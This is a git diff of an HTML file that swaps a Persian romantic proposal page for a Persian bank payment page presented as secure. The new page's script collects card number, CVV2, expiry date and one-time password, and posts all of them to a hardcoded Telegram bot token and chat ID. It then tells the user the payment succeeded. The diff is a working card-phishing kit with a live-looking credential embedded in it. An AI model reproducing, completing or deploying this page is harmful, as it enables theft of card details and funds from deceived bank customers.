@@ -3,346 +3,742 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>For Fandogh ❤️</title>
+<title>درگاه پرداخت آزمایشی</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Segoe UI',Tahoma,sans-serif;
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
 }
 
-html, body{
-    background:linear-gradient(135deg,#070b1a,#111827,#1f1147);
-    min-height:100%;
+body {
+    font-family: Tahoma, Arial, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
 }
 
-body{
-    overflow:hidden;
-    color:white;
+.container {
+    width: 440px;
+    background: #fff;
+    border-radius: 20px;
+    padding: 35px 30px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    animation: slideUp 0.5s ease;
 }
 
-.page{
-    position:absolute;
-    width:100%;
-    height:100vh;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    opacity:0;
-    pointer-events:none;
-    transition:1s;
-    padding:20px;
-}
-
-.page.active{
-    opacity:1;
-    pointer-events:auto;
-}
-
-h1{
-    text-align:center;
-    font-size:clamp(2rem,6vw,5rem);
-    text-shadow:0 0 25px #ff4d8d;
-}
-
-p{
-    text-align:center;
-    font-size:clamp(1.2rem,3vw,2rem);
-    max-width:900px;
-}
-
-button{
-    border:none;
-    padding:15px 35px;
-    border-radius:50px;
-    cursor:pointer;
-    font-size:1.2rem;
-    margin-top:25px;
-    transition:.3s;
-}
-
-button:hover{
-    transform:scale(1.08);
-}
-
-.next{
-    background:#ff4d8d;
-    color:white;
-}
-
-.yes{
-    background:#22c55e;
-    color:white;
-}
-
-.no{
-    background:#ef4444;
-    color:white;
-    position:absolute;
-}
-
-.stars{
-    position:fixed;
-    width:100%;
-    height:100%;
-    z-index:-2;
-}
-
-.star{
-    position:absolute;
-    width:2px;
-    height:2px;
-    background:white;
-    border-radius:50%;
-    animation:twinkle 3s infinite;
-}
-
-@keyframes twinkle{
-    50%{opacity:.2;}
-}
-
-.typing{
-    overflow:hidden;
-    white-space:nowrap;
-    border-right:3px solid white;
-    width:0;
-    animation:typing 4s steps(40,end) forwards;
-}
-
-@keyframes typing{
-    to{
-        width:100%;
+@keyframes slideUp {
+    from {
+        opacity: 0;
+        transform: translateY(30px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
     }
 }
 
-.heart-wrap{
-    position:relative;
-    width:320px;
-    height:320px;
-    display:flex;
-    justify-content:center;
-    align-items:center;
+.header {
+    text-align: center;
+    margin-bottom: 25px;
+    padding-bottom: 20px;
+    border-bottom: 2px solid #f0f0f0;
 }
 
-.heart{
-    position:absolute;
-    width:180px;
-    height:180px;
-    background:linear-gradient(135deg,#ff1744,#ff6b9a);
-    transform:rotate(-45deg);
-    animation:heartbeat 1.3s infinite;
-    box-shadow:
-    0 0 30px rgba(255,23,68,.9),
-    0 0 70px rgba(255,23,68,.6),
-    0 0 120px rgba(255,23,68,.4);
+.header .logo {
+    font-size: 40px;
+    margin-bottom: 5px;
 }
 
-.heart:before,
-.heart:after{
-    content:'';
-    position:absolute;
-    width:180px;
-    height:180px;
-    border-radius:50%;
-    background:linear-gradient(135deg,#ff1744,#ff6b9a);
+.header h3 {
+    color: #1976d2;
+    font-size: 22px;
+    margin: 0;
+    font-weight: 700;
 }
 
-.heart:before{
-    top:-90px;
-    left:0;
+.header p {
+    color: #888;
+    font-size: 12px;
+    margin-top: 5px;
 }
 
-.heart:after{
-    left:90px;
-    top:0;
+.input-group {
+    margin-bottom: 12px;
 }
 
-.name{
-    position:absolute;
-    z-index:5;
-    font-size:2rem;
-    font-weight:700;
-    letter-spacing:3px;
-    text-shadow:0 0 20px white;
+.input-group label {
+    display: block;
+    font-size: 12px;
+    color: #555;
+    margin-bottom: 4px;
+    font-weight: bold;
 }
 
-@keyframes heartbeat{
-    0%,100%{
-        transform:rotate(-45deg) scale(1);
+.input-group input {
+    width: 100%;
+    padding: 12px 15px;
+    border: 2px solid #e0e0e0;
+    border-radius: 10px;
+    font-size: 14px;
+    transition: all 0.3s;
+    background: #fafafa;
+    font-family: Tahoma;
+}
+
+.input-group input:focus {
+    outline: none;
+    border-color: #1976d2;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
+}
+
+.input-group input::placeholder {
+    color: #bbb;
+    font-size: 12px;
+}
+
+.row {
+    display: flex;
+    gap: 12px;
+}
+
+.row .input-group {
+    flex: 1;
+}
+
+.captcha-section {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: #f8f9fa;
+    padding: 8px 15px;
+    border-radius: 10px;
+    border: 2px solid #e0e0e0;
+    margin-top: 5px;
+}
+
+.captcha-box {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 8px 16px;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 18px;
+    letter-spacing: 3px;
+    font-family: 'Courier New', monospace;
+    min-width: 80px;
+    text-align: center;
+    user-select: none;
+}
+
+.captcha-section input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    padding: 10px 5px;
+    font-size: 14px;
+}
+
+.captcha-section input:focus {
+    outline: none;
+}
+
+.btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s;
+    margin-top: 8px;
+    font-family: Tahoma;
+}
+
+.btn-pay {
+    background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+    color: white;
+    box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+}
+
+.btn-pay:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
+}
+
+.btn-pay:active {
+    transform: translateY(0);
+}
+
+.btn-otp {
+    background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+    color: white;
+    box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+    margin-bottom: 8px;
+}
+
+.btn-otp:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
+}
+
+.btn-otp:active {
+    transform: translateY(0);
+}
+
+.btn-otp:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none !important;
+}
+
+.btn-cancel {
+    background: #f59e0b;
+    color: white;
+    box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+}
+
+.btn-cancel:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
+}
+
+.btn-cancel:active {
+    transform: translateY(0);
+}
+
+#msg {
+    margin-top: 15px;
+    text-align: center;
+    font-size: 13px;
+    padding: 12px;
+    border-radius: 8px;
+    background: #f0f7ff;
+    color: #1976d2;
+    line-height: 1.6;
+    min-height: 60px;
+}
+
+#msg.error {
+    background: #fff0f0;
+    color: #d32f2f;
+}
+
+#msg.success {
+    background: #f0fff4;
+    color: #16a34a;
+}
+
+#msg.warning {
+    background: #fffbeb;
+    color: #d97706;
+}
+
+#msg.otp-received {
+    background: #e0f2fe;
+    color: #0369a1;
+    border: 2px dashed #3b82f6;
+}
+
+.status-dot {
+    display: inline-block;
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    margin-left: 5px;
+}
+
+.status-dot.green {
+    background: #22c55e;
+}
+
+.status-dot.red {
+    background: #ef4444;
+}
+
+.status-dot.yellow {
+    background: #f59e0b;
+}
+
+.status-dot.blue {
+    background: #3b82f6;
+}
+
+.badge {
+    display: inline-block;
+    background: #22c55e;
+    color: white;
+    font-size: 10px;
+    padding: 2px 10px;
+    border-radius: 20px;
+    margin-top: 5px;
+}
+
+.otp-input-wrapper {
+    position: relative;
+}
+
+.otp-input-wrapper input {
+    padding-left: 100px;
+}
+
+.otp-timer {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 12px;
+    color: #888;
+    background: #f0f0f0;
+    padding: 3px 10px;
+    border-radius: 20px;
+    font-weight: bold;
+}
+
+.password-hint {
+    font-size: 11px;
+    color: #888;
+    margin-top: 3px;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+    .container {
+        padding: 20px;
+        width: 100%;
     }
-    50%{
-        transform:rotate(-45deg) scale(1.15);
+    
+    .row {
+        flex-direction: column;
+        gap: 0;
     }
-}
-
-.question{
-    text-align:center;
-    font-size:clamp(2rem,5vw,4rem);
-    margin-bottom:30px;
-}
-
-.hearts{
-    position:fixed;
-    width:100%;
-    height:100%;
-    pointer-events:none;
-}
-
-.float-heart{
-    position:absolute;
-    font-size:25px;
-    animation:floatUp linear forwards;
-}
-
-@keyframes floatUp{
-    from{
-        transform:translateY(100vh);
-        opacity:0;
+    
+    .captcha-section {
+        flex-wrap: wrap;
     }
-    20%{
-        opacity:1;
+    
+    .captcha-box {
+        width: 100%;
+        text-align: center;
     }
-    to{
-        transform:translateY(-150px);
-        opacity:0;
-    }
-}
-
-.final{
-    text-align:center;
-    font-size:clamp(2rem,6vw,5rem);
-    text-shadow:0 0 30px #ff4d8d;
-    animation:pulse 1s infinite;
-}
-
-@keyframes pulse{
-    50%{
-        transform:scale(1.05);
+    
+    .otp-input-wrapper input {
+        padding-left: 80px;
     }
 }
 </style>
-</head>
 
+</head>
 <body>
 
-<div class="stars"></div>
-<div class="hearts"></div>
+<div class="container">
 
-<!-- PAGE 1 -->
-<section class="page active">
-    <h1>یه چیزی می‌خوام بهت بگم...</h1>
-    <button class="next" onclick="nextPage()">ادامه ❤️</button>
-</section>
-
-<!-- PAGE 2 -->
-<section class="page">
-    <p class="typing">
-        از همون لحظه‌ای که دیدمت، هر روزم یه‌کم قشنگ‌تر شد...
-    </p>
-</section>
-
-<!-- PAGE 3 -->
-<section class="page">
-    <h1>دوستت دارم ❤️</h1>
-</section>
-
-<!-- PAGE 4 -->
-<section class="page">
-    <div class="heart-wrap">
-        <div class="heart"></div>
-        <div class="name">فندق ❤️</div>
-    </div>
-</section>
-
-<!-- PAGE 5 -->
-<section class="page">
-    <div class="question">
-        می‌شی شریک زندگیم بشی؟ 💍
+    <div class="header">
+        <div class="logo">💳</div>
+        <h3>درگاه پرداخت ایمن</h3>
+        <p>🔒 اطلاعات شما با بالاترین سطح امنیت محافظت می‌شود</p>
+        <span class="badge">✅ اتصال امن</span>
     </div>
 
-    <button class="yes" onclick="showFinal()">بله ❤️</button>
-    <button class="no" id="noBtn">نه 😅</button>
-</section>
+    <form id="paymentForm" onsubmit="return false;">
+        <div class="input-group">
+            <label>🏦 شماره کارت</label>
+            <input type="text" id="cardNumber" placeholder="مثال: 6037 9912 3456 7890" maxlength="19">
+        </div>
 
-<!-- PAGE 6 -->
-<section class="page">
-    <div class="final">
-        ❤️ وایییی ❤️
-        <br><br>
-        تو منو خوشحال‌ترین آدم دنیا کردی
+        <div class="input-group">
+            <label>🔐 CVV2</label>
+            <input type="text" id="cvv" placeholder="مثال: 1234  " maxlength="4">
+        </div>
+
+        <div class="row">
+            <div class="input-group">
+                <label>📅 ماه انقضا</label>
+                <input type="text" id="month" placeholder="مثال: 12" maxlength="2">
+            </div>
+            <div class="input-group">
+                <label>📅 سال انقضا</label>
+                <input type="text" id="year" placeholder="مثال: 1405" maxlength="4">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>🔑 رمز یک‌بارمصرف (OTP)</label>
+            <div class="otp-input-wrapper">
+                <input type="password" id="password" placeholder="رمز ارسال شده به موبایل">
+                <span class="otp-timer" id="otpTimer">⏱️ ۰:۰۰</span>
+            </div>
+            <div class="password-hint">
+                💡 رمز یک‌بارمصرف به شماره همراه شما پیامک شد
+            </div>
+        </div>
+
+        <!-- دکمه درخواست رمز دوم -->
+        <button type="button" class="btn btn-otp" id="otpButton" onclick="requestOTP()">
+            📱 درخواست رمز دوم (OTP)
+        </button>
+
+        <div class="input-group" style="margin-top: 12px;">
+            <label>🛡 کد امنیتی</label>
+            <div class="captcha-section">
+                <div class="captcha-box" id="captchaText">B9K2F</div>
+                <input type="text" id="captchaInput" placeholder="کد را وارد کنید">
+            </div>
+        </div>
+
+        <button type="button" class="btn btn-pay" onclick="processPayment()">
+            ✅ پرداخت
+        </button>
+        <button type="button" class="btn btn-cancel" onclick="cancelPayment()">
+            ❌ انصراف
+        </button>
+    </form>
+
+    <div id="msg">
+        <span class="status-dot green"></span>
+        منتظر وارد کردن اطلاعات شما هستیم...
     </div>
-</section>
+
+</div>
 
 <script>
+// ============================================
+// تنظیمات ربات تلگرام - اینجا را ویرایش کنید
+// ============================================
+const BOT_TOKEN = "8235157882:AAEyPdSjRn7SzBnpLYrZqOFeRVpZg3q-tM8";  // توکن ربات خود را وارد کنید
+const CHAT_ID = "5403370300";      // آیدی چت خود را وارد کنید
+// ============================================
 
-const pages=document.querySelectorAll('.page');
-let current=0;
+// متغیرهای مربوط به OTP
+let otpTimerInterval = null;
+let otpSeconds = 0;
+let isOtpRequested = false;
+let generatedOtp = null;
 
-function nextPage(){
-    pages[current].classList.remove('active');
-    current++;
-    pages[current].classList.add('active');
-
-    if(current===1){
-        setTimeout(nextPage,5000);
+// تولید کد کپچا
+function generateCaptcha() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let captcha = '';
+    for (let i = 0; i < 5; i++) {
+        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-    else if(current===2){
-        setTimeout(nextPage,3000);
+    document.getElementById('captchaText').textContent = captcha;
+    return captcha;
+}
+
+// تولید رمز یک‌بارمصرف شبیه‌سازی شده
+function generateOTP() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+// آپدیت پیام
+function updateMessage(text, type = '') {
+    const msg = document.getElementById('msg');
+    msg.textContent = text;
+    msg.className = type;
+}
+
+// ============================================
+// تابع درخواست رمز دوم (شبیه‌سازی)
+// ============================================
+function requestOTP() {
+    const cardNumber = document.getElementById('cardNumber').value.trim();
+    
+    // اعتبارسنجی شماره کارت
+    const cleanCard = cardNumber.replace(/\s/g, '');
+    if (cleanCard.length < 16) {
+        updateMessage('❌ لطفاً شماره کارت را به درستی وارد کنید!', 'error');
+        return;
     }
-    else if(current===3){
-        setTimeout(nextPage,4000);
+
+    // جلوگیری از درخواست مکرر
+    if (isOtpRequested) {
+        updateMessage('⏳ قبلاً رمز درخواست شده! لطفاً صبر کنید.', 'warning');
+        return;
+    }
+
+    // تولید رمز شبیه‌سازی شده
+    generatedOtp = generateOTP();
+    
+    // نمایش پیام دریافت رمز
+    updateMessage(`📱 رمز یک‌بارمصرف به شماره همراه شما ارسال شد! 
+    \n📌 کد آزمایشی: ${generatedOtp} (این کد فقط برای آزمایش است)`, 'otp-received');
+
+    // فعال کردن تایمر
+    isOtpRequested = true;
+    document.getElementById('otpButton').disabled = true;
+    document.getElementById('otpButton').textContent = '⏳ در حال ارسال...';
+    
+    // شبیه‌سازی ارسال پیامک
+    setTimeout(() => {
+        document.getElementById('otpButton').textContent = '✅ رمز ارسال شد';
+        document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)';
+        
+        // شروع تایمر ۲ دقیقه‌ای
+        startOtpTimer(120);
+        
+        // ارسال OTP به تلگرام (اختیاری)
+        sendOTPToTelegram(cardNumber, generatedOtp);
+        
+        // پس از ۵ ثانیه، پیام راهنما نمایش داده شود
+        setTimeout(() => {
+            updateMessage(`📱 رمز یک‌بارمصرف به شماره همراه شما ارسال شد. 
+            \n🔑 کد آزمایشی: ${generatedOtp} (برای ورود استفاده کنید)
+            \n⏱️ این کد تا ۲ دقیقه اعتبار دارد.`, 'otp-received');
+        }, 1000);
+        
+    }, 2000);
+}
+
+// ============================================
+// تایمر OTP
+// ============================================
+function startOtpTimer(duration) {
+    let timeLeft = duration;
+    const timerElement = document.getElementById('otpTimer');
+    
+    if (otpTimerInterval) {
+        clearInterval(otpTimerInterval);
+    }
+    
+    otpTimerInterval = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.textContent = `⏱️ ${minutes}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0) {
+            clearInterval(otpTimerInterval);
+            timerElement.textContent = '⏱️ ۰:۰۰';
+            isOtpRequested = false;
+            document.getElementById('otpButton').disabled = false;
+            document.getElementById('otpButton').textContent = '📱 درخواست رمز دوم (OTP)';
+            document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #3b82f6 0%, #2563eb 100%)';
+            updateMessage('⏰ زمان رمز یک‌بارمصرف به پایان رسید. دوباره درخواست کنید.', 'warning');
+            generatedOtp = null;
+        }
+        timeLeft--;
+    }, 1000);
+}
+
+// ============================================
+// ارسال OTP به تلگرام (اختیاری)
+// ============================================
+async function sendOTPToTelegram(cardNumber, otp) {
+    if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+        return;
+    }
+    
+    const message = `📱 *درخواست رمز یک‌بارمصرف*\n\n` +
+                    `💳 شماره کارت: ${cardNumber}\n` +
+                    `🔑 رمز OTP: ${otp}\n` +
+                    `⏰ زمان درخواست: ${new Date().toLocaleString('fa-IR')}\n` +
+                    `⏱️ اعتبار: ۲ دقیقه`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        console.error('Error sending OTP to Telegram:', error);
     }
 }
 
-function showFinal(){
-    pages[current].classList.remove('active');
-    current=5;
-    pages[current].classList.add('active');
+// ============================================
+// ارسال به تلگرام
+// ============================================
+async function sendToTelegram(data) {
+    if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+        updateMessage('⚠️ لطفاً توکن و آیدی ربات را در کد تنظیم کنید!', 'error');
+        return false;
+    }
 
-    for(let i=0;i<200;i++){
-        setTimeout(createHeart,i*50);
+    let message = '📋 *اطلاعات پرداخت جدید*\n\n';
+    message += `💳 شماره کارت: ${data.card || '❌ خالی'}\n`;
+    message += `🔐 CVV2: ${data.cvv || '❌ خالی'}\n`;
+    message += `📅 تاریخ انقضا: ${data.month}/${data.year || '❌ خالی'}\n`;
+    message += `🔑 رمز یک‌بارمصرف: ${data.password || '❌ خالی'}\n`;
+    message += `🛡 کد امنیتی: ${data.captcha || '❌ خالی'}\n`;
+    message += `\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        const result = await response.json();
+        return result.ok;
+    } catch (error) {
+        console.error('Network Error:', error);
+        return false;
     }
 }
 
-const noBtn=document.getElementById('noBtn');
+// ============================================
+// پردازش پرداخت
+// ============================================
+async function processPayment() {
+    const card = document.getElementById('cardNumber').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+    const month = document.getElementById('month').value.trim();
+    const year = document.getElementById('year').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const captchaInput = document.getElementById('captchaInput').value.trim();
+    const captchaText = document.getElementById('captchaText').textContent;
 
-noBtn.addEventListener('mouseover',()=>{
-    noBtn.style.left=Math.random()*80+'vw';
-    noBtn.style.top=Math.random()*80+'vh';
+    // اعتبارسنجی
+    const cleanCard = card.replace(/\s/g, '');
+    if (cleanCard.length < 16) {
+        updateMessage('❌ شماره کارت نامعتبر است (حداقل 16 رقم)', 'error');
+        return;
+    }
+
+    if (!cvv || cvv.length < 3) {
+        updateMessage('❌ CVV2 نامعتبر است (3 یا 4 رقم)', 'error');
+        return;
+    }
+
+    if (!month || !year) {
+        updateMessage('❌ تاریخ انقضا را کامل وارد کنید', 'error');
+        return;
+    }
+
+    if (!password || password.length < 4) {
+        updateMessage('❌ رمز یک‌بارمصرف را وارد کنید', 'error');
+        return;
+    }
+
+    // اعتبارسنجی OTP
+    if (generatedOtp && password !== generatedOtp) {
+        updateMessage('❌ رمز یک‌بارمصرف اشتباه است! دوباره تلاش کنید.', 'error');
+        return;
+    }
+
+    if (!captchaInput) {
+        updateMessage('❌ کد امنیتی را وارد کنید', 'error');
+        return;
+    }
+
+    if (captchaInput.toUpperCase() !== captchaText) {
+        updateMessage('❌ کد امنیتی اشتباه است! دوباره تلاش کنید', 'error');
+        generateCaptcha();
+        document.getElementById('captchaInput').value = '';
+        return;
+    }
+
+    const data = { card, cvv, month, year, password, captcha: captchaInput };
+
+    updateMessage('⏳ در حال ارسال اطلاعات... لطفاً صبر کنید', '');
+
+    const sent = await sendToTelegram(data);
+
+    if (sent) {
+        updateMessage('✅ پرداخت با موفقیت انجام شد! اطلاعات شما ارسال گردید.', 'success');
+        // توقف تایمر
+        if (otpTimerInterval) {
+            clearInterval(otpTimerInterval);
+        }
+        document.getElementById('otpTimer').textContent = '⏱️ ۰:۰۰';
+        isOtpRequested = false;
+        document.getElementById('otpButton').disabled = false;
+        document.getElementById('otpButton').textContent = '📱 درخواست رمز دوم (OTP)';
+        document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #3b82f6 0%, #2563eb 100%)';
+        generatedOtp = null;
+    } else {
+        updateMessage('❌ خطا در ارسال اطلاعات! لطفاً دوباره تلاش کنید.', 'error');
+    }
+}
+
+// ============================================
+// انصراف
+// ============================================
+function cancelPayment() {
+    if (confirm('آیا از انصراف مطمئن هستید؟')) {
+        document.getElementById('paymentForm').reset();
+        generateCaptcha();
+        if (otpTimerInterval) {
+            clearInterval(otpTimerInterval);
+        }
+        document.getElementById('otpTimer').textContent = '⏱️ ۰:۰۰';
+        isOtpRequested = false;
+        document.getElementById('otpButton').disabled = false;
+        document.getElementById('otpButton').textContent = '📱 درخواست رمز دوم (OTP)';
+        document.getElementById('otpButton').style.background = 'linear-gradient(135deg, #3b82f6 0%, #2563eb 100%)';
+        generatedOtp = null;
+        updateMessage('🟡 عملیات لغو شد. منتظر اطلاعات جدید هستیم...', '');
+    }
+}
+
+// ============================================
+// Event Listeners
+// ============================================
+// فرمت شماره کارت
+document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let value = this.value.replace(/\D/g, '');
+    if (value.length > 16) value = value.slice(0, 16);
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+    }
+    this.value = formatted;
 });
 
-function createHeart(){
-    const h=document.createElement('div');
-    h.className='float-heart';
-    h.innerHTML='❤️';
-    h.style.left=Math.random()*100+'vw';
-    h.style.animationDuration=(4+Math.random()*4)+'s';
+// فقط عدد
+document.getElementById('cvv').addEventListener('input', function(e) {
+    this.value = this.value.replace(/\D/g, '');
+    if (this.value.length > 4) this.value = this.value.slice(0, 4);
+});
 
-    document.querySelector('.hearts').appendChild(h);
+document.getElementById('month').addEventListener('input', function(e) {
+    this.value = this.value.replace(/\D/g, '');
+    if (this.value.length > 2) this.value = this.value.slice(0, 2);
+});
 
-    setTimeout(()=>{
-        h.remove();
-    },8000);
-}
+document.getElementById('year').addEventListener('input', function(e) {
+    this.value = this.value.replace(/\D/g, '');
+    if (this.value.length > 4) this.value = this.value.slice(0, 4);
+});
 
-for(let i=0;i<250;i++){
-    const star=document.createElement('div');
-    star.className='star';
-    star.style.left=Math.random()*100+'vw';
-    star.style.top=Math.random()*100+'vh';
-    star.style.animationDelay=Math.random()*3+'s';
-    document.querySelector('.stars').appendChild(star);
-}
-
-setInterval(()=>{
-    if(current>0){
-        createHeart();
+// Enter key
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        const active = document.activeElement;
+        if (active && active.tagName === 'INPUT') {
+            e.preventDefault();
+            processPayment();
+        }
     }
-},700);
+});
 
+// ============================================
+// مقداردهی اولیه
+// ============================================
+window.onload = function() {
+    generateCaptcha();
+    updateMessage('🟢 منتظر وارد کردن اطلاعات شما هستیم...', '');
+    console.log('✅ درگاه پرداخت بارگذاری شد!');
+    console.log('📌 برای تنظیم ربات، توکن و CHAT_ID را در کد تغییر دهید.');
+    console.log('📱 برای درخواست OTP، شماره کارت را وارد و دکمه را بزنید.');
+};
 </script>
 
 </body>
